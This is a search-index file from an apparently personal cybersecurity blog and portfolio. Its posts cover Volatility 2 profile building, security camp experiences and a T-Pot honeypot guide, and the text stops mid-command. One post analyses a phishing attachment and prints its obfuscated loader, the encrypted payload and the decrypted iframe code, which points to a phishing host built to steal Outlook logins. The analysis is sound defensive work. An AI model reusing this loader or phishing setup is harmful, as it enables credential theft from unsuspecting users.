{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#about-me","title":"About Me","text":"<p>A person who is continuously trying to learn and improve in cybersecurity and leadership.</p>"},{"location":"#achievements","title":"Achievements","text":"Year Event Name Rank / Place Won 2023 APU Internal CTF Champion 2023 Girls in CTF Champion 2024 Girls in CTF Champion 2024 PwC Hack A Day CTF - Securing Identity Champion 2024 Wicked6 - HackTheBox CTF Champion 2023 Game of Hackers (GOH) 2nd Place 2024 Wicked6 - Meta CTF 2nd Place 2024 Cyber Cohesion Women CTF 2nd Place 2023 ITREX CTF 3rd Place 2023 UTAR CTF - The Amazing Cyberhunt 3rd Place 2023 PwC Hack A Day CTF - Securing AI 3rd Place 2023 Petronas CTF 4th Place 2024 UTAR CTF - The Amazing Cyberhunt 5th Place 2023 Siber Siaga CTF 9th Place 2024 rENTAS CTF Finalist"},{"location":"#activities","title":"Activities","text":"Year Event Name Role 2022 Battle of Hackers (BOH) 2022 Organizer 2022 Malaysia Cybersecurity Camp (MCC) 2022 Participant 2023 BAT x APU CTF 2023 Organizer 2023 Malaysia Cybersecurity Camp (MCC) 2023 Crew 2023 A Guide to Gamified Learning - Beginner Level Author 2023 A Beginner's Journey in CTF Workshop Speaker 2023 The Rise of Kali CTF Workshop Speaker 2024 Wireshark Wonders - Diving into the Shark Tank Speaker 2024 International Battle of Hackers (BOH) 2024 Organizer"},{"location":"#certifications","title":"Certifications","text":"Year Certification Issuing Organization 2023 Rocheston Certified Cybersecurity Engineer (RCCE) Rocheston 2025 Google Cybersecurity Professional Certificate Google 2025 Certified Defensive Security Analyst (CDSA) Hack The Box 2025 Certified Fundamentals in Cybersecurity Fortinet 2025 Certified Associate in Cybersecurity Fortinet"},{"location":"#contact","title":"Contact","text":"<p>LinkedIn: https://linkedin.com/in/jiaqiyeo</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/","title":"Build a Linux Profile for Volatility 2","text":"<p>Step-by-step guide on building an Ubuntu profile for Volatility 2 and fixing the errors.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#introduction","title":"Introduction","text":"<p>When we are doing memory analysis using Volatility 2, we have to specify the profile of the memory dump. This ensures the tool analyzes the memory dump correctly and provides accurate results. In this blog, I will be writing on how to build a Linux (Ubuntu) profile on Volatility 2 for memory analysis. It might sound easy at first, but you might face a lot of errors during the process.</p> <p>I will be going through from start, which is when we get the memory dump and identify the profile, all the way through building the profile in Volatility 2 and fixing bugs and errors. I will be using the memory dump that I got from a CTF competition, named <code>cydes.raw</code>.</p> <p>Steps to build a new Volatility 2 profile</p> <ol> <li>Create virtual machine with the operating system we need</li> <li>Update to the specific kernel version we need</li> <li>Build profile and create profile</li> <li>Move the profile to Volatility in our own machine</li> </ol>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#why-create-profile","title":"Why Create Profile?","text":"<p>Volatility 2 does not have any Linux profile by default. All the profiles available are in Windows operating system. <pre><code>python2 vol.py --info | grep Profile\n</code></pre> We can use the command above to see all the profiles available in Volatility 2.</p> <p></p> <p>Therefore, when we are going to analyze the memory dump with the profile that is not available in default Volatility 2, <code>imageinfo</code> plugin will show that there is no suggested profile, as it could not find any information from the available profile.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#start-building","title":"Start Building","text":"<p>In order to build a Linux profile, we need to identify which distribution and kernel version used.</p> <pre><code>strings &lt;FILE&gt; | grep -i \"GNU/Linux\"\n</code></pre> <p>We can use the command above to get more information that we want.</p> <p></p> <p>Based on the output, we know it is running Ubuntu 22.04 LTS, with the kernel version of <code>5.15.0-75-generic x86_64</code>. Therefore, we need to install an Ubuntu 22.04 LTS virtual machine to get the kernel profile.</p> <p>Tip</p> <p>Some people use docker instead of creating the entire virtual machine, you can find more information here.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#configuring-virtual-machine","title":"Configuring Virtual Machine","text":"<p>Once the installation of the Ubuntu virtual machine is done, we need to update the kernel version to the version we would like to build a profile for. <pre><code>sudo apt update\nsudo apt install linux-image-5.15.0-75-generic\nsudo apt install linux-headers-5.15.0-75-generic\n</code></pre></p> <p>Info</p> <p><code>linux-image-5.15.0-75-generic</code>: It is the actual kernel that will be running</p> <p><code>linux-headers-5.15.0-75-generic</code>: It is the kernel header that has the necessary information for compiling software</p> <p>After that, we need to reboot the machine to update the changes.</p> <p></p> <p>Once rebooted, we can list all the downloaded kernels to verify the installation.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#error-original-kernel-is-more-up-to-date","title":"Error: Original kernel is more up-to-date","text":"<p>If the kernel from the virtual machine we downloaded is more up-to-date, it will not update the kernel we want for us. </p> <pre><code>uname -r\n</code></pre> <p>You can use the command above to verify if your kernel has been loaded successfully as it will show the kernel version that the system is currently running.</p> <p>If the kernel version remains the same, we need to downgrade the kernel version by choosing the kernel version in GRUB menu.</p> <p>Info</p> <p>GRUB menu is an interface that allows user to choose the kernel version when a Linux operating system is booted.</p> <p>To load GRUB menu, you can use shortcuts (refer here), but that did not work for me so I will use another method which will show GRUB menu every time the system boots.</p> <pre><code>sudo nano /etc/default/grub\n</code></pre> <p>We can use <code>nano</code> to edit the GRUB menu configuration file.</p> <p></p> <p>Edit <code>GRUB_TIMEOUT_STYLE</code> variable and <code>GRUB_TIMEOUT</code> variable to the value above so that the menu will appear when the system boots.</p> <p>Tip</p> <p>You can put any value you prefer for <code>GRUB_TIMEOUT</code> other than 0. If you put 30, it means it will be timed out after 30 seconds and continue booting the system if you left the menu unselected.</p> <pre><code>sudo update-grub\n</code></pre> <p>Once done editing, run the command above to update the configuration. Then, restart the machine to load GRUB menu.</p> <p></p> <p>Once GRUB menu loaded, choose <code>Advanced options for Ubuntu</code>.</p> <p></p> <p>Then select the kernel version that we would like it to load.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#build-profile","title":"Build Profile","text":"<p>Now we are moving on to build the profile. Before we start, let\u2019s install some of the tools:</p> <pre><code>sudo apt install dwarfdump build-essential \n</code></pre> <p>Info</p> <p><code>dwarfdump</code>:  A tool that analyzes and dumps the DWARF debugging information.</p> <p><code>build-essential</code>: Meta-packages (a set of packages) that are necessary for compiling software.</p> <p>DWARF: A file format for debugging information.</p> <p>Let\u2019s install the most important tool: Volatility 2</p> <pre><code>sudo apt install git\ngit clone https://github.com/volatilityfoundation/volatility.git\npython2 setup.py install\n</code></pre> <p>Then, change directory to <code>volatility/tools/linux</code> to compile necessary components to build the profile by using the command <code>make</code>.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#error-missing-module_license","title":"Error: Missing MODULE_LICENSE()","text":"<p>You might encounter this error where it says \u201cmissing MODULE_LICENSE()\u201d. You will need to add one line to <code>module.c</code> file to mention about the MODULE_LICENSE.</p> <pre><code>echo 'MODULE_LICENSE(\"GPL\");' &gt;&gt; module.c\n</code></pre> <p>This will add the license to the last line of <code>module.c</code> file, which will then solve the problem. For more information, you can refer here.</p> <p></p> <p>The image above shows the successful output of <code>make</code> command which successfully created a <code>module.dwarf</code> file for us. </p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#add-profile-into-volatility-2","title":"Add Profile into Volatility 2","text":"<p>Get the System.map of our specific kernel version and copy the file name to be used later. System.map has the physical memory location for everything that is required by kernel, and we are going to use it to build our profile.</p> <pre><code>sudo zip volatility/plugins/overlays/linux/Ubuntu2204-515.zip tools/linux/module.dwarf /boot/System.map-5.15.0-75-generic\n</code></pre> <p>Info</p> <p><code>volatility/plugins/overlays/linux/Ubuntu2204-515.zip</code>: This is the file name that will be created (and its path). It will be shown later as the profile name in Volatility</p> <p><code>tools/linux/module.dwarf</code> &amp; <code>/boot/System.map-5.15.0-75-generic</code>: These two files will be zipped and it will be the profile (which is <code>Ubuntu2204-515.zip</code>)</p> <p></p> <p>Then, run volatility with <code>--info</code> to get the information page which will list available profiles and commands of Volatility. Use <code>grep</code> to search for string \u201cubuntu\u201d, and <code>-i</code> will help search for the string case-insensitively.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#move-profile-to-own-machine","title":"Move Profile to Own Machine","text":"<p>Once the profile created, we can then move the profile to our own machine to analyze our memory dump with the newly created profile.</p> <p></p> <p>You can download the profile to the same location as mentioned in section before.</p> <p>Tip</p> <p>There are many ways to transfer the file, you can just drag and drop from virtual machine to host machine, or in my case I hosted a web server to transfer the file.</p> <p></p> <p>Once done, run the same command again to verify the successful import of the profile. I <code>grep</code> \u201dProfile\u201d this time to see all the profiles available.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#keyerror-dw_at_data_member_location","title":"KeyError: \u2018DW_AT_data_member_location\u2019","text":"<p>Although everything seems done and successful, we might face the error below when we are to use start analyzing our memory dump using the newly imported profile:</p> <p></p> <p>It is common Volatility 2 issue as it does not support newer kernels, which you could find the issue here. </p> <pre><code>git clone https://github.com/miszr/volatility.git\ngit branch -a\ngit checkout dwarf-5\ngit merge origin/patch-1\n</code></pre> <p>The solution has been given here, where we need to clone another version of Volatility 2. </p> <p>Info</p> <p><code>git branch -a</code>: Show all branches available</p> <p><code>git checkout dwarf-5</code>: Switch to branch named <code>dwarf-5</code></p> <p><code>git merge origin/patch-1</code>: Merge changes from <code>origin/patch-1</code> branch with <code>dwarf-5</code> </p> <p></p> <p>With this, we can then successfully analyze our memory dump without any issues.</p>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#resources","title":"Resources","text":"<ul> <li>HTB CTF Compromised Writeup</li> <li>GRUB Menu Not Showing on Boot</li> <li>Volatility Memory Analysis: Building Kernel Profiles</li> <li>Official Volatility Page for Building Linux Profiles</li> </ul>"},{"location":"blog/2023/12/30/build-a-linux-profile-for-volatility-2/#special-thanks","title":"Special thanks","text":"<ul> <li>zachwong02</li> </ul>"},{"location":"blog/2024/03/01/gcc-2024-participants-experience/","title":"GCC 2024: Participant's Experience","text":"<p>Sharing my experience as the only female participant from Malaysia in Glocal Cybersecurity Camp (GCC) 2024.</p>"},{"location":"blog/2024/03/01/gcc-2024-participants-experience/#overview","title":"Overview","text":"<p> Recently, I was given an opportunity to attend GCC 2024 which was held in Chon Buri, Thailand. GCC is a global camp that involves people from different countries so that we can connect together.</p> <p> I am glad and proud to be one of the five representatives from Malaysia for attending this camp as a participant! This is a photo taken together with SherpaSec staff, thanks for their effort bringing us here~</p>"},{"location":"blog/2024/03/01/gcc-2024-participants-experience/#trainings","title":"Trainings","text":"<p> The journey kicked off with a delightful dinner party on day 0 (Sunday), providing an excellent opportunity to make new friends. Following this, we delved into 5 days of training sessions covering various topics.</p> <p> All the trainings were pretty interesting. One of the most memorable trainings is \"Hunting with a Dinosaur\", where we learned to use Velociraptor to perform threat hunting. The trainer created a very interesting storyline (he told me he cracked his head and spent a lot of time for this storyline, appreciate his effort!), which consists of three victim machines and all of them are interconnected. Our task was to use Velociraptor to perform threat hunting and digital forensics on those machines and try to find their relationship and connect the story.</p> <p> Another training was about threat intelligence. The trainer gave us an in-depth explanation on threat intelligence which was extremely insightful. The trainer was super nice and tried to answer all our questions until we understand everything.</p> <p> Throughout the training, we were fueled by coffee (provided by hotel) and enjoyed snacks from different countries, generously provided by the participants. The snacks were great and coffee kept us awake throughout the day!</p>"},{"location":"blog/2024/03/01/gcc-2024-participants-experience/#group-project","title":"Group Project","text":"<p> On the first day of training, we were assigned to groups with members from different countries, and each group was given a topic to work on the group project. On the last day of the training, we would need to do a short presentation on our group project.   This collaborative approach not only facilitated group members working closely together but also strengthened the bonds among us. I really enjoyed working together with my groupmates throughout the camp!  From initial research to development and presentation, we shared a rollercoaster of emotions \u2014 confusion, stress, happiness, relief \u2014 forging lasting connections between us.</p>"},{"location":"blog/2024/03/01/gcc-2024-participants-experience/#conclusion","title":"Conclusion","text":"<p> Overall, I enjoyed this camp a lot. Meeting new people from different countries and understanding more about their culture, education, and cybersecurity-related events in their countries allowed me to expand my own knowledge. Everyone in this camp has different specialties and interests in different field, which allowed us to exchange and share our knowledge to one another.</p> <p>Once again thanks to our sponsor SherpaSec as well as the organizers for GCC 2024! Hope to meet everyone again in the future~</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/","title":"MCC 2022: Participant's Experience","text":"<p>Sharing my experience as a participant in Malaysian Cybersecurity Camp (MCC) 2022.</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#what-is-mcc","title":"What is MCC?","text":"<p>MCC, also known as Malaysia Cybersecurity Camp, is a cybersecurity event organized by RE:HACK and NanoSec Asia. It aims to reduce the gap between students and professionals while providing the chance for students to build connection with local cybersecurity experts. It is a closed event, only the selected students can be invited to the event. Students have to submit the registration form and go through the interview in order to participate in this event. In this blog post, I will be sharing my experience in this event, from the captivating trainings and group assignments to the memorable interactions with fellow participants and industry leaders.</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#experience-in-mcc-2022","title":"Experience in MCC 2022","text":""},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#preparing-for-mcc","title":"Preparing for MCC","text":"<p>I was called for an interview few months after I submitted the registration form. There were few people in the interview, including organizers and crews. All of them were very friendly, and the interview was mainly to know more about us. I thought I did badly in the interview and had no chance to join this event, until I received an email telling me that I was selected to MCC 2022...</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#activities-in-mcc-2022","title":"Activities in MCC 2022","text":"<p>MCC 2022 was a 4-day event, with 2 days of trainings. The trainings consisted of both red teaming and blue teaming, and students can choose the training that they prefer.</p> <p></p> <p>All trainers were local cybersecurity experts from various industries, which were passionate in cybersecurity and keened to provide training to students.</p> <p>Apart from trainings, we (participants of MCC 2022) were also assigned to groups so that we can work together with our groupmates throughout this 4-day event. We were also given several assignments that were created by the MCC crews. All of us had to work in our own group to solve the assignment, and present them to the crews.</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#memorable-moments-and-lasting-connections","title":"Memorable Moments and Lasting Connections","text":"<p>All the organizers, crews and trainers are very friendly, which allowed me to easily blend in and build connection with them. As we were given group assignments to do, I had the chance to know more about my groupmates and communicate with them, while enjoyed solving the assignment as a team. During dinner time, some of my groupmates drove us to eat outside together, which further enhance our friendship!</p> <p>During the 2 days of training, the trainers were very approachable and patient, which allowed all of us to ask questions freely whenever we need more explanation on any specific topic.</p> <p>On the last day of the event, we had a dinner with organizers, sponsors, trainers and crews. There were some short talks, small prize giving ceremony, and networking sessions for everyone to keep in touch in the future.</p> <p></p> <p>Even though the event lasted only four days, we manage to build a strong and good connections with one another. We joined events and talks together, and even organized meetups to spend more time bonding.</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#lesson-learned-and-growth","title":"Lesson Learned and Growth","text":""},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#build-a-supportive-community","title":"Build a Supportive Community","text":"<p>It was an extremely valuable experience as it immersed me in a community of like-minded individuals driven by a shared passion and common goals. Interacting with this community not only helped me a lot in terms of giving me the exposure of the cybersecurity field, but also in terms of mental support which was the motivation to learn more and always be \"hungry\" to strive for knowledge.</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#share-knowledge-for-mutual-benefit","title":"Share Knowledge for Mutual Benefit","text":"<p>The diverse knowledge levels within the MCC community presented opportunities for mutual growth through knowledge sharing. I am grateful to meet all the awesome participants who did not hesitate to share knowledge to me, which allowed me to further improve myself while fostering meaningful relationship.</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#embrace-the-power-of-inquiry","title":"Embrace the Power of Inquiry","text":"<p>Through MCC 2022, I learned the importance of shedding shyness when it comes to seeking answers. As we progress in our learning journey, we discover the vastness of our knowledge gaps. Thus, it is crucial to overcome hesitation and ask the right questions. By reaching out to others and seeking guidance, we can overcome obstacles and continue our growth.</p>"},{"location":"blog/2023/06/23/mcc-2022-participants-experience/#conclusion","title":"Conclusion","text":"<p>I am very grateful and thankful for being invited to join as a participant in MCC 2022. It was an extremely good opportunity for me to improve myself and build connections with others. If you are interested and would like to know more about this event, feel free to check out their official website.</p>"},{"location":"blog/2024/12/02/reversing-a-phishing-webpage/","title":"Reversing a Phishing Webpage","text":"<p>This blog shows the steps of analyzing and reverse engineering a Microsoft Outlook login page that is sent through phishing email.</p>"},{"location":"blog/2024/12/02/reversing-a-phishing-webpage/#overview","title":"Overview","text":"<p>This blog post explores the reverse engineering of a self-contained phishing webpage disguised as a Microsoft Outlook login page, which was delivered as an HTML attachment in a phishing email targeting an organization's employees. The phishing page operates independently, embedding the recipient\u2019s email to enhance credibility while using obfuscated JavaScript and encrypted payloads to evade detection. By analyzing its structure, deobfuscating encoded scripts, and decrypting hidden content, we uncover how attackers craft deceptive login portals to steal credentials. Understanding these techniques helps in detecting, mitigating, and preventing similar phishing threats in the future.</p> <p>What is a self-contained webpage?</p> <p>A self-contained webpage is a web page that includes all its resources in a single file, which means that it works without relying on any external resources or files.</p>"},{"location":"blog/2024/12/02/reversing-a-phishing-webpage/#analyzing-the-webpage","title":"Analyzing the Webpage","text":"<p> After verifying the file type using <code>file</code> command, we can confirm that it is a HTML file.</p> <p> Viewing the HTML file in the browser in a safe environment, we can see that it is presented as a fake Microsoft login page, with a specific email of the victim in the organization. Therefore, we can confirm that this is indeed a phishing page.</p> <p>Note</p> <p>Note that this page will not load properly when it is opened in Linux environment. Therefore, we can say that this phishing attempt is targeted to Windows users only.</p> <p> By viewing the details in the HTML file, we can see that there is a suspicious code which is base64 encoded. Decoding it will give us another link.</p>"},{"location":"blog/2024/12/02/reversing-a-phishing-webpage/#view-element-inspect-the-webpage","title":"View Element / Inspect the Webpage","text":"<p> Inspecting the page in the browser will see that it is trying to load other links.</p> <p> Looking through the Network tab shows that it is visiting several links that look suspicious.</p>"},{"location":"blog/2024/12/02/reversing-a-phishing-webpage/#deobfuscate-the-code","title":"Deobfuscate the Code","text":"<p> Visiting the suspicious link will direct us to a similar Microsoft login page. From here, we are able to know that how the self-contained webpage without much elements can present a Microsoft login page to the victim as they are loading an external link to display the page.</p> <p> Browsing to another suspicious link from the Network tab will give us some obfuscated JavaScript code and some suspicious base64 encoded strings. Decoding the base64 encoded strings will give us the result below:</p> <pre><code>{\"a\":\"uOkAOFJp02TwxVmtqz56AXKEkKO7zTFH8+qx\\/eFWLVX0aJdFiaOTGZGPO7otVOmVB85\\/76zM4X8NjLBvGjKtUJ7IlNXPRsrF6uikrMSIZInPcCMAQXXXPRbxckS4OCN1Ey0A+trNAoWfObVyULJpdtISulWZsmt+iJE1u6zudKZiYh7Mgz9mrLkXl4LpoFcZW0+\\/7HyPjkK+Szr5uoC+aNrUQgvb1ZGKnA7TQjjj4FzQl1yATbLAfhdC8N3tkSE0BmZuo2jd3uSoMkRxW6BDsbioI+pvyRz5VtUrnP2GULpPy4WkCcBxWB6RUKqMwC9duyDyHt7g77n2JhGj2kwpK+e3x5vZSllp8n\\/zEIoHum2+cwmA5RPfPDI+nUWIGcEaH2Yxhfd6U8u5INT+ajIhy9AGf7FYTtkLujIIxz\\/5TcjIjV75Ccu1o0CEaRLHssjSN9HQpz6a6A91WTJ7IGDXvBuMVDPjwosBWcftoaY39yxk+vZcOmq5tB1FJ7j1nAAEkMWcmpr9JjhFgDfEw71FvE8qpL4YdBZDnIhVqVYk8L4I\\/etWk4\\/nbHrDnUduvx+v34khbPSKJo2PZJ7yf0CQtoZ40qBK0\\/tZqKF8nnArmCAgkdTzX3CA+4E1b9DATWgxwnqgeR8hjQ6W682FAIDgl2VVEGaE+Gl8T8HLBFgaVS7v7MPhXacIH49W1ytIFXCK1mW5aGnPZgjr56KF9B3v\\/gdg4+6DD+AY0x6k4PuxDOWmzjBgnOwX0fp5WykhTWSNHLtkuTfMvLlfryOmflu4iZ7QaZAZXhHi+IRDkQQ2Y86ByA9t9rz5b9\\/C8B0FkyaahHaXug4WTtROTaq9loI2x2N234vwNvZAb233hxASAEHF3lTbIpjXxygunyEImD+we5MGWeKwMdGPhHHfwVMReO5kzBWZJQpR5IlTjU3CdavDp+ONC81DeUoHSH18iO6e\\/xr3MliBcgG5CQO3oxOF0UsNToHm0IcLxqDGdz7OD2oEUBDvYoEDXS2byGQWdmtziHtMQU9iFr+p8igZaZgbdX8uCqSjXEwj516BjDGTuEiw8kOAUEt8L2qYVZDWMttumXOUFcMz1Dsp\\/O+23JtgxQ==\",\"b\":\"67e80d86d161031a\",\"c\":\"64c7d68a087d16c1\",\"d\":\"3732386231353330313339636133633132313935343332366564333138383532\"}\n</code></pre>"},{"location":"blog/2024/12/02/reversing-a-phishing-webpage/#reversing-the-code","title":"Reversing the Code","text":"<p>By combining the decoded base64 code, this will be the complete code:</p> <p><pre><code>var vREUMQflsVlGKTMy = document.createElement(\"script\");\nvREUMQflsVlGKTMy.setAttribute(\"src\",\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js\");\ndocument.head.append(vREUMQflsVlGKTMy);\nvREUMQflsVlGKTMy.onload=function(){\nvar {a,b,c,d} = JSON.parse({\"a\":\"uOkAOFJp02TwxVmtqz56AXKEkKO7zTFH8+qx\\/eFWLVX0aJdFiaOTGZGPO7otVOmVB85\\/76zM4X8NjLBvGjKtUJ7IlNXPRsrF6uikrMSIZInPcCMAQXXXPRbxckS4OCN1Ey0A+trNAoWfObVyULJpdtISulWZsmt+iJE1u6zudKZiYh7Mgz9mrLkXl4LpoFcZW0+\\/7HyPjkK+Szr5uoC+aNrUQgvb1ZGKnA7TQjjj4FzQl1yATbLAfhdC8N3tkSE0BmZuo2jd3uSoMkRxW6BDsbioI+pvyRz5VtUrnP2GULpPy4WkCcBxWB6RUKqMwC9duyDyHt7g77n2JhGj2kwpK+e3x5vZSllp8n\\/zEIoHum2+cwmA5RPfPDI+nUWIGcEaH2Yxhfd6U8u5INT+ajIhy9AGf7FYTtkLujIIxz\\/5TcjIjV75Ccu1o0CEaRLHssjSN9HQpz6a6A91WTJ7IGDXvBuMVDPjwosBWcftoaY39yxk+vZcOmq5tB1FJ7j1nAAEkMWcmpr9JjhFgDfEw71FvE8qpL4YdBZDnIhVqVYk8L4I\\/etWk4\\/nbHrDnUduvx+v34khbPSKJo2PZJ7yf0CQtoZ40qBK0\\/tZqKF8nnArmCAgkdTzX3CA+4E1b9DATWgxwnqgeR8hjQ6W682FAIDgl2VVEGaE+Gl8T8HLBFgaVS7v7MPhXacIH49W1ytIFXCK1mW5aGnPZgjr56KF9B3v\\/gdg4+6DD+AY0x6k4PuxDOWmzjBgnOwX0fp5WykhTWSNHLtkuTfMvLlfryOmflu4iZ7QaZAZXhHi+IRDkQQ2Y86ByA9t9rz5b9\\/C8B0FkyaahHaXug4WTtROTaq9loI2x2N234vwNvZAb233hxASAEHF3lTbIpjXxygunyEImD+we5MGWeKwMdGPhHHfwVMReO5kzBWZJQpR5IlTjU3CdavDp+ONC81DeUoHSH18iO6e\\/xr3MliBcgG5CQO3oxOF0UsNToHm0IcLxqDGdz7OD2oEUBDvYoEDXS2byGQWdmtziHtMQU9iFr+p8igZaZgbdX8uCqSjXEwj516BjDGTuEiw8kOAUEt8L2qYVZDWMttumXOUFcMz1Dsp\\/O+23JtgxQ==\",\"b\":\"67e80d86d161031a\",\"c\":\"64c7d68a087d16c1\",\"d\":\"3732386231353330313339636133633132313935343332366564333138383532\"});\nvar cZGceBhgvsmehtWx = CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(d),CryptoJS.enc.Hex.parse(b),{hasher:CryptoJS.algo.SHA512,keySize:64/8,iterations:999});\nBvfzMQepfEJSRDWS = CryptoJS.AES.decrypt(a,cZGceBhgvsmehtWx,{iv:CryptoJS.enc.Hex.parse(c)}).toString(CryptoJS.enc.Utf8);\nBvfzMQepfEJSRDWS = BvfzMQepfEJSRDWS.replace(/taPrwRNRJOtebyHj/g, NeaAWu);\ndocument.write(BvfzMQepfEJSRDWS);\n}\n</code></pre> After getting the complete code, we need to understand it line by line in order to decrypt the code.</p> <p><pre><code>var cZGceBhgvsmehtWx = CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(d),CryptoJS.enc.Hex.parse(b),{hasher:CryptoJS.algo.SHA512,keySize:64/8,iterations:999});\n</code></pre> This line of code is using the CryptoJS library to perform a key derivation function (KDF) called PBKDF2 (Password-Based Key Derivation Function 2). The purpose of PBKDF2 is to securely derive a cryptographic key from a password or passphrase. The PBKDF2 key created is stored in a variable named <code>cZGceBhgvsmehtWx</code>. According to the CryptoJS documentation, the parameter is defined as <code>CryptoJS.PBKDF2(passphrase, salt, keysize)</code>. Including all other parameters, we can conclude that:  - passphrase = d - salt = b - hash = 512 - key size = 64 bits - iterations = 999</p> <p> However, for some unknown reason, the key size is incorrect. In the end, we need to use trial and error method to find out that the key size is 256 bit. Using all the information we have, we can then derive a key using CyberChef. </p> <p><pre><code>BvfzMQepfEJSRDWS = CryptoJS.AES.decrypt(a,cZGceBhgvsmehtWx,{iv:CryptoJS.enc.Hex.parse(c)}).toString(CryptoJS.enc.Utf8);\nBvfzMQepfEJSRDWS = BvfzMQepfEJSRDWS.replace(/taPrwRNRJOtebyHj/g, NeaAWu);\ndocument.write(BvfzMQepfEJSRDWS);\n</code></pre> This line of code decrypts a AES-encrypted content. According to the CryptoJS documentation, the parameter is defined as <code>CryptoJS.AES.decrypt(encrypted-msg, passphrase)</code>. Including all other parameters, we can conclude that:  - encrypted-msg = a - passphrase = cZGceBhgvsmehtWx (which we decoded previously) - iv = c</p> <p> Do note that we need to base64 decode the variable <code>a</code> before we use AES decrypt as the content is encoded in base64 initially. With all the information given, we will be able to decrypt the content. </p> <p>Decrypted content:</p> <pre><code>var ifMgQMPeYEbXJsAn = document.createElement('iframe');\n    ifMgQMPeYEbXJsAn.sandbox.add('allow-same-origin');\n    ifMgQMPeYEbXJsAn.sandbox.add('allow-top-navigation');\n    ifMgQMPeYEbXJsAn.sandbox.add('allow-modals');\n    ifMgQMPeYEbXJsAn.sandbox.add('allow-scripts');\n    ifMgQMPeYEbXJsAn.sandbox.add('allow-popups-to-escape-sandbox');\n    ifMgQMPeYEbXJsAn.sandbox.add('allow-forms');\n    ifMgQMPeYEbXJsAn.src =  \"https://href.li/?https://xociso.leciphom.com/GnSzT/\"+\"taPrwRNRJOtebyHj\";\n    ifMgQMPeYEbXJsAn.style.cssText = 'position: fixed; inset: 0px; width: 100%; height: 100%; border: 0px; margin: 0px;padding: 0px; overflow: hidden; z-index: 999999;';\n    document.write(ifMgQMPeYEbXJsAn);\n    document.body.innerHTML = \"\";\n    document.body.appendChild(ifMgQMPeYEbXJsAn);\n    &lt;/script&gt;\n</code></pre>"},{"location":"blog/2024/12/02/reversing-a-phishing-webpage/#conclusion","title":"Conclusion","text":"<p>By reverse engineering this phishing webpage, we uncovered how attackers use self-contained HTML attachments with obfuscated scripts and encrypted payloads to evade detection and steal credentials. The phishing page dynamically loads external content and embeds the victim\u2019s email to appear more convincing. Understanding these techniques enables security professionals to better detect, analyze, and mitigate similar threats, strengthening organizational defenses against phishing attacks.</p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/","title":"Deploy T-Pot in Azure Cloud for Free","text":"<p>Step-by-step guide on deploying an open-source honeypot named T-Pot in Azure Cloud using free student credit.</p> <p>T-Pot is an all-in-one honeypot platform that is open-source. It integrates 20+ honeypots in a docker-based environment for us to study and analyze various attack vectors.</p> <p>In this blog, we will be guiding you through step-by-step on deploying T-Pot in Azure cloud.</p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#azure-for-students","title":"Azure for Students","text":"<p> For students, Azure provides free $100 Azure credit without any credit card required. This is a good opportunity to allow students to learn more about cloud infrastructure. More details about the free student plan can be found here.</p> <p>There is also a post about this on T-Pot discussion page, guiding us for deploying T-Pot in cloud, and we will be following the guide with more detailed explanation for it.  </p> <p>A big shout-out to the author for sharing this valuable guide in the discussion!</p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#deploy-a-virtual-machine-in-azure-cloud","title":"Deploy a Virtual Machine in Azure Cloud","text":""},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#get-subscription-id","title":"Get Subscription ID","text":"<p> Before we start to create a virtual machine, we need to get subscription ID for further usage later. In the search bar, search for <code>Subscriptions</code> and go to the page.   You can get your subscription ID here. Save it for further usage.  </p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#open-azure-cloud-shell","title":"Open Azure Cloud Shell","text":"<p> Now go back to home page by clicking <code>Home</code> and will be redirected to this page. You will then need to create an Azure virtual machine following the steps above.   Following the guide from the T-Pot discussion, we will be using CLI to create our virtual machine instead of GUI so it is much more efficient. Make sure to open Azure Cloud Shell following the steps above, and we will be diving into the command line configuration in the following steps. </p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#create-a-virtual-machine","title":"Create a Virtual Machine","text":"<p>This step is used to set the active subscription for our Azure account. It may not be necessary, but it can help avoid confusion in some cases according to the discussion guideline. <pre><code>az account set --subscription [subscription-id]\n</code></pre></p> <p>Now we will be creating networking components which are resource group, virtual network (VNet), subnet, and network security group (NSG) using the commands below:</p> <pre><code># create a new resource group in a specific Azure region\n# you can choose location closest to you (eg. 'southeastasia', 'eastus')\naz group create --name rg-tpot --location 'southeastasia'\n\n# create a Virtual Network (VNet)\naz network vnet create --resource-group rg-tpot --location southeastasia --name vnet-tpot --address-prefixes 10.0.0.0/16\n\n# create a subnet within an existing Azure VNet\naz network vnet subnet create --resource-group rg-tpot --vnet-name vnet-tpot --name subnet-tpot --address-prefixes 10.0.0.0/24\n\n# create a Network Security 